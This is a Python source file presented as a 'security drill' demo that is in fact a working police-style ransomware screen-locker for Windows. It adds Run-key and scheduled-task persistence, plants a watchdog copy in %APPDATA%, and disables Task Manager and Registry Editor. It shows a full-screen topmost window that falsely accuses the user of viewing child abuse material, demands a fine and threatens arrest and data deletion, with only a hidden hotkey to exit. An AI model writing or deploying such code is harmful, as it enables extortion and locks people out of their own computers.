# -*- coding: utf-8 -*-
"""
网络安全演练 UI - 终极单 EXE 版（内嵌 watchdog）
========================================================
功能：
    - 首次运行释放 watchdog.exe 到 %APPDATA%\SecurityDemo，启动后退出
    - watchdog 负责持续监控并拉起主程序副本
    - 主程序具备开机自启、计划任务、禁用任务管理器/注册表等粘性功能
    - 退出方式：Ctrl+Shift+Q 连续 3 次（ESC 已移除）
    - 左上角徽章支持图片（badge.png）
    - 自定义弹窗支持图片（info.png），无标题栏
    - 控制台仅显示启动信息，详细日志写入文件
⚠️ 仅用于网络安全教学演练，禁止恶意使用
"""
import sys
import os
import subprocess
import tempfile
import shutil
import time
import random
import string
import math
import socket
import tkinter as tk
from tkinter import messagebox
from datetime import datetime, timedelta
from pathlib import Path

# 尝试导入 PIL（用于 PNG 图片支持）
try:
    from PIL import Image, ImageTk
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# ============================================================
# 日志系统（控制台仅显示启动信息，详细日志写入文件）
# ============================================================
_log_file = None

def init_log():
    """初始化日志文件（在程序启动时调用）"""
    global _log_file
    try:
        # 确定日志目录
        if getattr(sys, 'frozen', False):
            base_dir = os.path.dirname(sys.executable)
        else:
            base_dir = os.getcwd()
        log_dir = os.path.join(base_dir, 'logs')
        os.makedirs(log_dir, exist_ok=True)
        log_path = os.path.join(log_dir, f'SecurityDemo_{datetime.now().strftime("%Y%m%d")}.log')
        _log_file = open(log_path, 'a', encoding='utf-8')
        # 写入一条分隔线
        _log_file.write(f"\n{'='*60}\n")
        _log_file.write(f"日志开始: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        _log_file.flush()
    except Exception as e:
        # 若文件打开失败，降级为仅控制台
        print(f"[警告] 无法创建日志文件: {e}")
        _log_file = None

def log(msg, console=None):
    """
    写入日志：
      - 若 console 未指定，自动判断：包含 '✅' 或 '❌' 则仅写文件，不打印控制台
      - 否则打印到控制台并写入文件
    """
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    full_msg = f"[{timestamp}] {msg}"
    # 写入文件
    if _log_file:
        try:
            _log_file.write(full_msg + '\n')
            _log_file.flush()
        except:
            pass
    # 决定是否打印到控制台
    if console is None:
        # 自动判断：若含有操作符号，则默认不打印到控制台
        console = not ('✅' in msg or '❌' in msg)
    if console:
        print(full_msg)

# ============================================================
# 配置 【仅调大面板尺寸，其余颜色常量保持原样】
# ============================================================
WINDOW_BG = "#050505"
PANEL_WIDTH = 1280
PANEL_HEIGHT = 860
WHITE = "#FFFFFF"
BLACK = "#000000"
RED = "#FF1010"
DARK_RED = "#A00000"
BLUE = "#0808E8"
GRAY = "#D3D3D3"
GREEN = "#008A00"

# ============================================================
# 工具函数
# ============================================================
def generate_demo_id():
    chars = string.ascii_uppercase + string.digits
    return "".join(random.choice(chars) for _ in range(10))

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return "127.0.0.1"

def get_hostname():
    try:
        return socket.gethostname()
    except:
        return "UNKNOWN-PC"

def get_timezone():
    try:
        return datetime.now().astimezone().tzinfo.__class__.__name__
    except:
        return "Local Time"

def get_current_time():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def is_admin():
    """检测当前进程是否以管理员权限运行（仅Windows）"""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

# ============================================================
# Windows 系统修改功能
# ============================================================
class WindowsPersistence:
    @staticmethod
    def is_windows():
        return sys.platform == "win32"

    @staticmethod
    def add_startup(exe_path):
        if not WindowsPersistence.is_windows():
            return False
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SecurityDemo", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            log("✅ 已添加开机自启", console=False)
            return True
        except Exception as e:
            log(f"❌ 添加开机自启失败: {e}", console=False)
            return False

    @staticmethod
    def remove_startup():
        if not WindowsPersistence.is_windows():
            return
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "SecurityDemo")
            winreg.CloseKey(key)
            log("✅ 已删除开机自启", console=False)
        except:
            pass

    @staticmethod
    def add_scheduled_task(exe_path):
        if not WindowsPersistence.is_windows():
            return False
        try:
            cmd = f'schtasks /create /tn "SecurityDemoTask" /tr "{exe_path}" /sc MINUTE /mo 1 /f'
            subprocess.run(cmd, shell=True, check=True, capture_output=True)
            log("✅ 已创建计划任务", console=False)
            return True
        except Exception as e:
            log(f"❌ 创建计划任务失败: {e}", console=False)
            return False

    @staticmethod
    def remove_scheduled_task():
        if not WindowsPersistence.is_windows():
            return
        try:
            subprocess.run('schtasks /delete /tn "SecurityDemoTask" /f', shell=True, capture_output=True)
            log("✅ 已删除计划任务", console=False)
        except:
            pass

    @staticmethod
    def disable_taskmgr():
        if not WindowsPersistence.is_windows():
            return False
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            log("✅ 已禁用任务管理器", console=False)
            return True
        except Exception as e:
            log(f"❌ 禁用任务管理器失败: {e}", console=False)
            return False

    @staticmethod
    def enable_taskmgr():
        if not WindowsPersistence.is_windows():
            return
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            log("✅ 已恢复任务管理器", console=False)
        except:
            pass

    @staticmethod
    def disable_regedit():
        if not WindowsPersistence.is_windows():
            return False
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            log("✅ 已禁用注册表编辑器", console=False)
            return True
        except Exception as e:
            log(f"❌ 禁用注册表编辑器失败: {e}", console=False)
            return False

    @staticmethod
    def enable_regedit():
        if not WindowsPersistence.is_windows():
            return
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
            log("✅ 已恢复注册表编辑器", console=False)
        except:
            pass

# ============================================================
# 【修复版】释放并启动 watchdog（解决onefile _MEIPASS销毁问题）
# ============================================================
def release_and_launch_watchdog():
    """释放内嵌的 watchdog.exe 到 %APPDATA%\SecurityDemo 持久目录并启动，返回是否成功"""
    if os.environ.get('WATCHDOG_LAUNCHED') == '1':
        log("检测WATCHDOG_LAUNCHED标记，跳过看门狗启动", console=False)
        return False

    # 获取内嵌资源路径
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))

    src_watchdog = os.path.join(base_path, 'watchdog.exe')
    log(f"内嵌watchdog源路径: {src_watchdog}", console=False)
    if not os.path.exists(src_watchdog):
        log("警告：未找到内嵌 watchdog.exe，跳过守护启动", console=False)
        return False

    appdata = os.getenv("APPDATA")
    if not appdata:
        log("错误：无法获取APPDATA环境变量", console=False)
        return False
    target_dir = os.path.join(appdata, "SecurityDemo")
    os.makedirs(target_dir, exist_ok=True)

    target_watchdog = os.path.join(target_dir, "watchdog.exe")
    log(f"watchdog目标释放路径: {target_watchdog}", console=False)

    try:
        src_size = os.path.getsize(src_watchdog)
        need_copy = True
        if os.path.exists(target_watchdog):
            dst_size = os.path.getsize(target_watchdog)
            if dst_size == src_size:
                need_copy = False
                log("watchdog本地文件已存在且大小一致，跳过复制", console=False)
        if need_copy:
            shutil.copy(src_watchdog, target_watchdog)
            log("watchdog.exe复制完成", console=False)

        if not os.path.exists(target_watchdog):
            log("错误：复制完成，但目标watchdog.exe不存在", console=False)
            return False
        if os.path.getsize(target_watchdog) != src_size:
            log("错误：watchdog.exe复制后大小不匹配，文件损坏", console=False)
            return False

        # ==========关键修复：复制自身到持久目录，watchdog监控副本，规避_MEIPASS删除==========
        main_exe_src = sys.executable
        main_exe_dst = os.path.join(target_dir, "main.exe")
        log(f"复制主程序自身到持久目录 {main_exe_dst}", console=False)
        src_main_size = os.path.getsize(main_exe_src)
        if not (os.path.exists(main_exe_dst) and os.path.getsize(main_exe_dst) == src_main_size):
            shutil.copy(main_exe_src, main_exe_dst)
            log("主程序副本复制完成", console=False)

        launch_target_exe = main_exe_dst
        # ==========end==========

        # 构造 watchdog 启动参数
        cmd = [target_watchdog, '--target', launch_target_exe]
        if '--persist' in sys.argv or '-p' in sys.argv:
            cmd.append('--persist')

        subprocess.Popen(
            cmd,
            creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        log("✅ watchdog 已成功启动，主进程准备退出", console=False)
        return True

    except Exception as e:
        log(f"❌ release_and_launch_watchdog 异常: {str(e)}", console=False)
        return False

# ============================================================
# 获取资源文件路径（兼容开发环境和打包环境）
# ============================================================
def resource_path(relative_path):
    """获取资源的绝对路径，支持 PyInstaller 打包"""
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# ============================================================
# 主 UI 类
# ============================================================
class SecurityDemoUI:
    def __init__(self, enable_persistence=False):
        self.enable_persistence = enable_persistence and WindowsPersistence.is_windows()
        self.is_admin = is_admin()  # 检测管理员权限
        self.root = tk.Tk()
        self.root.title("")
        self.root.configure(bg=WINDOW_BG)
        self.root.overrideredirect(True)
        self.root.attributes("-topmost", True)
        try:
            self.root.attributes("-fullscreen", True)
        except:
            w = self.root.winfo_screenwidth()
            h = self.root.winfo_screenheight()
            self.root.geometry(f"{w}x{h}+0+0")
        self.screen_width = self.root.winfo_screenwidth()
        self.screen_height = self.root.winfo_screenheight()
        self.demo_id = generate_demo_id()
        self.local_ip = get_local_ip()
        self.hostname = get_hostname()
        self.timezone = get_timezone()
        self.countdown_end = datetime.now() + timedelta(hours=72)
        self.exit_count = 0
        self.last_exit_press = 0

        # 启动信息输出到控制台（同时写入文件）
        log("======================================")
        log(f"启动时间：{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        log(f"本机 IP：{self.local_ip}")
        log(f"电脑名称：{self.hostname}")
        log("您的所在位置：已确定")
        log("计算机所有文件：已锁定")
        log("罚款支付：扫描二维码")
        log(f"进程守护：{'启用' if self.enable_persistence else '禁用'}")
        log(f"管理员权限：{'是' if self.is_admin else '否'}")

        # 构建 UI
        self.build_gui()
        # 启动实时更新
        self.update_live_info()
        self.update_countdown()
        # 绑定退出快捷键（仅 Ctrl+Shift+Q）
        self.root.bind("<Control-Shift-Q>", self.exit_shortcut)
        self.root.bind("<Control-Shift-q>", self.exit_shortcut)
        # 应用粘性
        if self.enable_persistence:
            self.apply_persistence()
        # 窗口关闭事件（清理）
        self.root.protocol("WM_DELETE_WINDOW", self.safe_exit)

    def build_gui(self):
        # 主背景
        bg = tk.Frame(self.root, bg=WINDOW_BG)
        bg.pack(fill="both", expand=True)
        # 中央面板
        panel_x = (self.screen_width - PANEL_WIDTH) // 2
        panel_y = (self.screen_height - PANEL_HEIGHT) // 2
        self.panel = tk.Frame(
            self.root,
            bg=WHITE,
            highlightbackground=RED,
            highlightthickness=6
        )
        self.panel.place(x=panel_x, y=panel_y, width=PANEL_WIDTH, height=PANEL_HEIGHT)
        # 顶部区域（徽章 + 状态）
        self.create_top()
        # 主体区域
        self.create_body()
        # 左下角标识
        tk.Label(
            self.root,
            text=f"SECURITY TRAINING DEMO    ID: {self.demo_id}",
            font=("Consolas", 9),
            fg="#777777",
            bg=WINDOW_BG
        ).place(x=16, y=self.screen_height - 28)

    def create_top(self):
        top = tk.Frame(self.panel, bg=WHITE)
        top.place(x=24, y=24, width=PANEL_WIDTH - 48, height=210)
        # --- 左侧徽章（支持图片，若图片不存在则绘制五角星） ---
        badge_container = tk.Frame(top, bg=WHITE, width=190, height=190)
        badge_container.place(x=8, y=4)
        badge_img_path = resource_path("badge.png")
        if os.path.exists(badge_img_path) and PIL_AVAILABLE:
            try:
                img = Image.open(badge_img_path)
                img.thumbnail((170, 170))
                self.badge_photo = ImageTk.PhotoImage(img)
                lbl = tk.Label(badge_container, image=self.badge_photo, bg=WHITE)
                lbl.place(relx=0.5, rely=0.5, anchor="center")
                log("✅ 已加载徽章图片 badge.png", console=False)
            except Exception as e:
                log(f"⚠️ 徽章图片加载失败，使用五角星: {e}", console=False)
                self._draw_star_badge(badge_container)
        else:
            if not PIL_AVAILABLE:
                log("⚠️ Pillow 未安装，无法显示 PNG 图片，使用五角星", console=False)
            else:
                log("⚠️ badge.png 未找到，使用五角星", console=False)
            self._draw_star_badge(badge_container)
        # --- 右侧状态框 ---
        self.status_box = tk.Frame(top, bg=GRAY, relief="solid", bd=1)
        self.status_box.place(x=820, y=12, width=390, height=182)
        self.ip_value = self._create_status_row(0, "本机 IP：", self.local_ip, GREEN)
        self.hostname_value = self._create_status_row(1, "设备名称：", self.hostname, BLACK)
        self.timezone_value = self._create_status_row(2, "当前时区：", self.timezone, BLACK)
        self.time_value = self._create_status_row(3, "当前时间：", get_current_time(), DARK_RED)
        self.persistence_value = self._create_status_row(4, "粘性模式：",
                                                         "启用" if self.enable_persistence else "禁用",
                                                         RED if self.enable_persistence else GREEN)

    def _draw_star_badge(self, container):
        canvas = tk.Canvas(container, width=190, height=190, bg=WHITE, highlightthickness=0)
        canvas.pack()
        canvas.create_oval(8, 8, 182, 182, fill="#E3E3E3", outline="#B0B0B0", width=2)
        canvas.create_oval(18, 18, 172, 172, fill="#E6C900", outline="#9B8700", width=2)
        canvas.create_oval(32, 32, 158, 158, fill="#D51920", outline="#A30000", width=2)
        self._draw_star(canvas, 95, 66, 28, "#FFD900")
        for x, y, r in [(58, 88, 10), (132, 88, 10), (68, 118, 9), (122, 118, 9)]:
            self._draw_star(canvas, x, y, r, "#FFD900")
        canvas.create_text(95, 142, text="安全演练", font=("Microsoft YaHei", 16, "bold"), fill="#FFD900")

    def _draw_star(self, canvas, cx, cy, radius, color):
        points = []
        for i in range(10):
            angle = math.pi / 2 + i * math.pi / 5
            r = radius if i % 2 == 0 else radius * 0.42
            x = cx + r * math.cos(angle)
            y = cy - r * math.sin(angle)
            points.extend([x, y])
        canvas.create_polygon(points, fill=color, outline=color)

    def _create_status_row(self, index, label, value, color):
        y = 14 + index * 32
        tk.Label(self.status_box, text=label, font=("Microsoft YaHei", 13),
                 bg=GRAY, fg="#111111", anchor="w").place(x=12, y=y, width=115)
        lbl = tk.Label(self.status_box, text=value, font=("Microsoft YaHei", 13, "bold"),
                       bg=GRAY, fg=color, anchor="w")
        lbl.place(x=130, y=y, width=235)
        return lbl

    def create_body(self):
        body = tk.Frame(self.panel, bg=WHITE)
        body.place(x=24, y=220, width=PANEL_WIDTH - 48, height=600)
        tk.Frame(body, bg="#BBBBEE").place(x=20, y=20, width=480, height=130)
        canvas = tk.Canvas(body, width=480, height=130, bg=WHITE, highlightthickness=0)
        canvas.place(x=8, y=8)
        canvas.create_rectangle(8, 8, 240, 122, fill="#D5003D", outline="")
        canvas.create_rectangle(240, 8, 472, 122, fill=BLUE, outline="")
        canvas.create_text(240, 65, text="你的电脑已被锁定！",
                           font=("Microsoft YaHei", 30, "bold"), fill=WHITE)
        tk.Label(body, text=f"执行编号：{self.demo_id}",
                 font=("Microsoft YaHei", 28, "bold"), bg=WHITE, fg="#006000", anchor="w").place(x=520, y=18)
        tk.Label(body, text="你被罚款", font=("Microsoft YaHei", 38, "bold"),
                 bg=WHITE, fg=BLACK, anchor="w").place(x=520, y=70)
        tk.Label(body, text="380元", font=("Microsoft YaHei", 34, "bold"),
                 bg=WHITE, fg=DARK_RED, anchor="w").place(x=780, y=68)
        text = (
            "您因多次访问包含中华人民共和国法律禁止的内容\n"
            "\n"
            "即恋童癖和虐待儿童内容的色情网站而被禁止。\n"
            "\n"
            "您必须根据第0945‑I3467361778号条例\n"
            "将800元 罚款转入公安部罚款征收账户。\n"
            "\n"
            "支付罚款后，您的计算机将自动解锁，将不会对您提起刑事诉讼！"
        )
        tk.Label(body, text=text, font=("Microsoft YaHei", 16),
                 bg=WHITE, fg="#111111", justify="left", wraplength=1150).place(x=16, y=160, width=1150, height=190)
        tk.Frame(body, bg="#D0D0D0").place(x=510, y=360, width=280, height=78)
        tk.Button(body, text="缴纳罚款", font=("Microsoft YaHei", 19, "bold"),
                  fg=WHITE, bg="#9D0000", activeforeground=WHITE, activebackground="#CC0000",
                  relief="flat", bd=0, command=self.show_demo_info).place(x=504, y=354, width=280, height=78)
        tk.Label(body, text="支付罚款后，您的计算机将自动解锁，将不会对您提起刑事诉讼！", font=("Microsoft YaHei", 20, "bold"),
                 bg=WHITE, fg=DARK_RED).place(x=0, y=450, width=1220, height=38)
        notice = (
            "重要须知！如果您拒绝支付罚款或试图在不支付罚款的情况下自行解除锁定，您计算机上的所有信息将被永久删除，以防止色情制品的传播\n"
            "警方将立即前往您的住处逮捕您。你将因观看和传播带有恋童癖和虐待儿童内容的色情制品而受到刑事起诉。罚款支付期限；通知和锁定发出后3小时。\n"
        )
        tk.Label(body, text=notice, font=("Microsoft YaHei", 14),
                 bg=WHITE, fg=DARK_RED, justify="center", wraplength=1180).place(x=24, y=495, width=1170, height=95)
        tk.Label(body, text="演练计时：", font=("Microsoft YaHei", 15, "bold"),
                 bg=WHITE, fg=BLACK).place(x=500, y=595)
        self.countdown_label = tk.Label(body, text="72:00:00", font=("Consolas", 22, "bold"),
                                        bg=WHITE, fg=DARK_RED)
        self.countdown_label.place(x=610, y=592)
        tk.Label(body, text="第0945‑I3467361778号罚款",
                 font=("Microsoft YaHei", 10), bg=WHITE, fg="#777777").place(x=0, y=645, width=1220)

    def update_live_info(self):
        try:
            self.local_ip = get_local_ip()
            self.ip_value.config(text=self.local_ip)
            self.hostname_value.config(text=get_hostname())
            self.timezone_value.config(text=get_timezone())
            self.time_value.config(text=get_current_time())
        except Exception as e:
            log(f"更新失败: {e}", console=False)
        self.root.after(2000, self.update_live_info)

    def update_countdown(self):
        remaining = (self.countdown_end - datetime.now()).total_seconds()
        if remaining <= 0:
            self.countdown_label.config(text="00:00:00")
            return
        hours, rem = divmod(int(remaining), 3600)
        mins, secs = divmod(rem, 60)
        self.countdown_label.config(text=f"{hours:02d}:{mins:02d}:{secs:02d}")
        self.root.after(1000, self.update_countdown)

    def show_demo_info(self):
        popup = tk.Toplevel(self.root)
        popup.title("")
        popup.overrideredirect(True)
        popup.attributes("-topmost", True)
        popup.configure(bg=WHITE)
        pw, ph = 620, 440
        sw = self.root.winfo_screenwidth()
        sh = self.root.winfo_screenheight()
        x = (sw - pw) // 2
        y = (sh - ph) // 2
        popup.geometry(f"{pw}x{ph}+{x}+{y}")
        popup.configure(highlightbackground=RED, highlightthickness=4)
        content_frame = tk.Frame(popup, bg=WHITE)
        content_frame.pack(fill="both", expand=True, padx=22, pady=22)
        info_img_path = resource_path("info.png")
        img_label = None
        if os.path.exists(info_img_path) and PIL_AVAILABLE:
            try:
                img = Image.open(info_img_path)
                img.thumbnail((240, 180))
                photo = ImageTk.PhotoImage(img)
                img_label = tk.Label(content_frame, image=photo, bg=WHITE)
                img_label.image = photo
                img_label.pack(pady=(0,14))
            except Exception as e:
                log(f"⚠️ 弹窗图片加载失败: {e}", console=False)
        info_text = (
            f"网络安全说明\n\n"
            f"执行编号：{self.demo_id}\n"
            f"本机 IP：{self.local_ip}\n"
            f"设备名称：{self.hostname}\n"
            f"时区：{self.timezone}\n\n"
            "你已被锁定。\n"
            "请扫描二维码缴纳罚款。"
        )
        lbl = tk.Label(content_frame, text=info_text, font=("Microsoft YaHei", 14),
                       bg=WHITE, fg=BLACK, justify="center")
        lbl.pack(pady=8)
        btn = tk.Button(content_frame, text="确 定", font=("Microsoft YaHei", 14, "bold"),
                        bg="#9D0000", fg=WHITE, relief="flat", bd=0,
                        command=popup.destroy, width=14, height=1)
        btn.pack(pady=16)
        popup.focus_set()

    def apply_persistence(self):
        exe_path = sys.executable
        WindowsPersistence.add_startup(exe_path)
        WindowsPersistence.add_scheduled_task(exe_path)
        WindowsPersistence.disable_taskmgr()
        WindowsPersistence.disable_regedit()
        log("✅ 所有粘性功能已应用", console=False)

    def cleanup_persistence(self):
        WindowsPersistence.remove_startup()
        WindowsPersistence.remove_scheduled_task()
        WindowsPersistence.enable_taskmgr()
        WindowsPersistence.enable_regedit()

        # 清理APPDATA目录下生成的watchdog与main副本
        appdata = os.getenv("APPDATA")
        if appdata:
            target_dir = os.path.join(appdata, "SecurityDemo")
            try:
                watchdog_path = os.path.join(target_dir, "watchdog.exe")
                main_copy = os.path.join(target_dir, "main.exe")
                if os.path.exists(watchdog_path):
                    os.remove(watchdog_path)
                if os.path.exists(main_copy):
                    os.remove(main_copy)
            except Exception as e:
                log(f"清理副本文件异常 {e}", console=False)
        log("✅ 清理完成", console=False)

    def exit_shortcut(self, event=None):
        now = time.time()
        if now - self.last_exit_press > 2.0:
            self.exit_count = 0
        self.last_exit_press = now
        self.exit_count += 1
        log(f"退出快捷键: {self.exit_count}/3", console=False)
        if self.exit_count >= 3:
            self.safe_exit()

    def safe_exit(self, event=None):
        log("正在安全退出...")
        if self.enable_persistence:
            self.cleanup_persistence()
        self.root.destroy()
        log("程序已退出")
        global _log_file
        if _log_file:
            try:
                _log_file.close()
            except:
                pass
        sys.exit(0)

    def run(self):
        self.root.mainloop()

# ============================================================
# 主入口
# ============================================================
def main():
    init_log()
    if os.environ.get('WATCHDOG_LAUNCHED') != '1':
        if release_and_launch_watchdog():
            sys.exit(0)
    enable_persistence = '--persist' in sys.argv or '-p' in sys.argv
    app = SecurityDemoUI(enable_persistence=enable_persistence)
    app.run()

if __name__ == '__main__':
    main()
